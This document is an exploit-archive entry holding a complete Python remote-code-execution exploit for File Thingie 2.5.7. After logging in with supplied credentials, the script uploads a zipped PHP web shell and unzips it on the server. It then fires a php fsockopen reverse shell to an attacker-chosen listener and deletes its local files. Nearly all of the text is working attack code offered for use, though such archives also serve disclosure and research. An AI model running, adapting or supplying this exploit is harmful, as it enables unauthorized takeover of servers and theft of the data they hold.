@@ -1,0 +1,197 @@
+id: 38671
+date: 05/05/2023
+title: File Thingie 2.5.7 - Remote Code Execution Exploit
+author: Maurice Fielenbach
+cves: 
+
+#!/usr/bin/python
+
+# Exploit Title: File Thingie 2.5.7 - Remote Code Execution (RCE)
+# Google Dork: N/A
+# Date: 27th of April, 2023
+# Exploit Author: Maurice Fielenbach (grimlockx) - Hexastrike Cybersecurity UG (haftungsbeschränkt)
+# Software Link: https://github.com/leefish/filethingie
+# Version: 2.5.7
+# Tested on: N/A
+# CVE: N/A
+
+# Vulnerability originally discovered / published by Cakes
+# Reference: https://www.exploit-db.com/exploits/47349
+# Run a local listener on your machine and youre good to go
+
+
+import os
+import argparse
+import requests
+import random
+import string
+import zipfile
+from urllib.parse import urlsplit, urlunsplit, quote
+
+
+class Exploit:
+    def __init__(self, target, username, password, lhost, lport):
+        self.target = target
+        self.username = username
+        self.password = password
+        self.lhost = lhost
+        self.lport = lport
+
+    def try_login(self) -> bool:
+        self.session = requests.Session()
+
+        post_body = {"ft_user": f"{self.username}", "ft_pass": f"{self.password}", "act": "dologin"}
+        response = self.session.post(self.target, data=post_body)
+
+        if response.status_code == 404:
+            print(f"[-] 404 Not Found - The requested resource {self.target} was not found")
+            return False
+
+        elif response.status_code == 200:
+
+            if "Invalid username or password" in response.text:
+                print(f"Invalid username or password")
+                return False
+
+            return True
+        
+    def create_new_folder(self) -> bool:
+        # Generate random string
+        letters = string.ascii_letters
+        self.payload_filename = "".join(random.choice(letters) for i in range(16))
+        headers = {"Content-Type": "application/x-www-form-urlencoded"}
+        post_body = {f"type": "folder", "newdir": f"{self.payload_filename}", "act": "createdir", "dir": "", "submit" :"Ok"}
+
+        print(f"[*] Creating new folder /{self.payload_filename}")
+        response = self.session.post(self.target, headers=headers, data=post_body)
+
+        if f"index.php?dir=/{self.payload_filename}" in response.text:
+            print(f"[+] Created new folder /{self.payload_filename}")
+            return True
+        
+        else:
+            print(f"[-] Could not create new folder /{self.payload_filename}")
+            return False
+
+    def create_payload(self) -> bool:
+        try:
+            with zipfile.ZipFile(f"{self.payload_filename}.zip", 'w', compression=zipfile.ZIP_DEFLATED) as zip_file:
+                    zip_file.writestr(f"{self.payload_filename}.php", "<?php if(isset($_REQUEST[\'cmd\'])){ echo \"<pre>\"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo \"</pre>\"; die; }?>")
+                    print(f"[+] Zipped payload to {self.payload_filename}.zip")
+                    return True
+        except:
+            print(f"[-] Could not create payload to {self.payload_filename}.zip")
+            return False
+
+    def upload_payload(self) -> bool:
+        # Set up the HTTP headers and data for the request
+        headers = {
+            b'Content-Type': b'multipart/form-data; boundary=---------------------------grimlockx'
+        }
+
+        post_body = (
+            '-----------------------------grimlockx\r\n'
+            'Content-Disposition: form-data; name="localfile-1682513975953"; filename=""\r\n'
+            'Content-Type: application/octet-stream\r\n\r\n'
+        )
+
+        post_body += (
+            '\r\n-----------------------------grimlockx\r\n'
+            'Content-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n'
+            '2000000\r\n'
+            '-----------------------------grimlockx\r\n'
+            f'Content-Disposition: form-data; name="localfile"; filename="{self.payload_filename}.zip"\r\n'
+            'Content-Type: application/zip\r\n\r\n'
+        )
+
+        # Read the zip file contents and append them to the data
+        with open(f"{self.payload_filename}.zip", "rb") as f:
+            post_body += ''.join(map(chr, f.read()))
+
+        post_body += (
+            '\r\n-----------------------------grimlockx\r\n'
+            'Content-Disposition: form-data; name="act"\r\n\r\n'
+            'upload\r\n'
+            '-----------------------------grimlockx\r\n'
+            'Content-Disposition: form-data; name="dir"\r\n\r\n'
+            f'/{self.payload_filename}\r\n'
+            '-----------------------------grimlockx\r\n'
+            'Content-Disposition: form-data; name="submit"\r\n\r\n'
+            'Upload\r\n'
+            '-----------------------------grimlockx--\r\n'
+        )
+
+        print("[*] Uploading payload to the target")
+
+        response = self.session.post(self.target, headers=headers, data=post_body)
+
+        if f"<a href=\"./{self.payload_filename}/{self.payload_filename}.zip\" title=\"Show {self.payload_filename}.zip\">{self.payload_filename}.zip</a>" in response.text:
+            print("[+] Uploading payload successful")
+            return True
+
+        else: 
+            print("[-] Uploading payload failed")
+            return False
+        
+    def get_base_url(self) -> str:
+        url_parts = urlsplit(self.target)
+        path_parts = url_parts.path.split('/')
+        path_parts.pop()
+        base_url = urlunsplit((url_parts.scheme, url_parts.netloc, '/'.join(path_parts), "", ""))
+        return base_url
+
+    def unzip_payload(self) -> bool:
+        print("[*] Unzipping payload")
+        headers = {"Content-Type": "application/x-www-form-urlencoded"}
+        post_body = {"newvalue": f"{self.payload_filename}.zip", "file": f"{self.payload_filename}.zip", "dir": f"/{self.payload_filename}", "act": "unzip"}
+        response = self.session.post(f"{self.target}", headers=headers, data=post_body)
+        
+        if f"<p class='ok'>{self.payload_filename}.zip unzipped.</p>" in response.text:
+            print("[+] Unzipping payload successful")
+            print(f"[+] You can now execute commands by opening {self.get_base_url()}/{self.payload_filename}/{self.payload_filename}.php?cmd=<command>")
+            return True
+
+        else: 
+            print("[-] Unzipping payload failed")
+            return False
+
+    def execute_payload(self) -> bool:
+        print("[*] Trying the get a reverse shell")
+
+        cmd = quote(f"php -r \'$sock=fsockopen(\"{self.lhost}\",{self.lport});system(\"/bin/bash <&3 >&3 2>&3\");\'")
+        print("[*] Executing payload")
+
+        response = self.session.get(f"{self.get_base_url()}/{self.payload_filename}/{self.payload_filename}.php?cmd={cmd}")
+        print("[+] Exploit complete")
+        
+        return True
+
+    def cleanup_local_files(self) -> bool:
+        if os.path.exists(f"{self.payload_filename}.zip"):
+            os.remove(f"{self.payload_filename}.zip")
+            print("[+] Cleaned up zipped payload on local machine")
+            return True
+        
+        print("[-] Could not clean up zipped payload on local machine")
+        return False
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target URL to ft2.php")
+    parser.add_argument("-u", "--username", dest="username", type=str, required=True, help="FileThingie username")
+    parser.add_argument("-p", "--password", dest="password", type=str, required=True, help="FileThingie password")
+    parser.add_argument("-L", "--LHOST", dest="lhost", type=str, required=True, help="Local listener ip")
+    parser.add_argument("-P", "-LPORT", dest="lport", type=int, required=True, help="Local listener port")
+    args = parser.parse_args()
+
+    exploit = Exploit(args.target, args.username, args.password, args.lhost, args.lport)
+    exploit.try_login()
+    exploit.create_new_folder()
+    exploit.create_payload()
+    exploit.upload_payload()
+    exploit.unzip_payload()
+    exploit.execute_payload()
+    exploit.cleanup_local_files()
+
+#  0day.today [2023-05-22]  #
